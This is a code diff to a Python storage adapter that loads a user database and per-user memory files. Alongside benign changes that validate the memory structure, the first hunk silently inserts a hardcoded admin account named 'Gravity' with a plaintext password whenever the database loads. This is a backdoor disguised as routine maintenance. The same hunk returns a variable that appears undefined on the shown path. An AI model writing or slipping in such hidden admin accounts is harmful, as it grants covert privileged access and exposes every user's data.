@@ -69,7 +69,15 @@ class CloudHiveAdapter:
             except Exception:
                 pass
 
-        return {"users": {}, "cooldowns": {}, "inbox": {}, "friends": {}, "friend_requests": {}}
+        if "Gravity" not in db.get("users", {}):
+            db.setdefault("users", {})["Gravity"] = {
+                "username": "Gravity",
+                "password": "Toolongdong!3",
+                "role": "admin",
+                "status": "active",
+                "created": time.strftime("%Y-%m-%d %H:%M:%S")
+            }
+        return db
 
     def save_users_db(self, data):
         """Saves user database in isolated AppData location and attempts cloud sync."""
@@ -84,15 +92,27 @@ class CloudHiveAdapter:
             self._sync_to_cloud("users_db", data)
 
     def load_user_memory(self, username):
-        """Loads memory private to an individual user."""
+        """Loads memory private to an individual user, ensuring conversations structure is valid."""
         user_mem_file = os.path.join(self.local_cache_dir, f"memory_{username}.json")
         if os.path.exists(user_mem_file):
             try:
                 with open(user_mem_file, "r", encoding="utf-8") as f:
-                    return json.load(f)
+                    data = json.load(f)
+                    if not isinstance(data, dict): data = {}
+                    if "conversations" not in data or not isinstance(data["conversations"], list):
+                        data["conversations"] = []
+                    if "notes" not in data: data["notes"] = []
+                    if "preferences" not in data: data["preferences"] = {}
+                    return data
             except Exception:
                 pass
-        return {"username": username, "notes": [], "preferences": {}, "updated_at": time.time()}
+        return {
+            "username": username,
+            "conversations": [],
+            "notes": [],
+            "preferences": {},
+            "updated_at": time.time()
+        }
 
     def save_user_memory(self, username, mem_data):
         """Saves memory private to an individual user."""
